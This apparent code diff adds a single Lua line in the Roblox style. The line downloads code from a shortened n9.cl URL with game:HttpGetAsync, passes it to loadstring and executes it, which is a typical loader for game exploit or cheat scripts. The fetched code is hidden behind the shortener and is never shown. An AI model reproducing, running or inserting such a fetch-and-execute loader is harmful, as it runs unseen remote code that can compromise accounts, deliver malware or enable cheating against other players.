@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync("https://n9.cl/23459"))("s15_ blew up heap!")
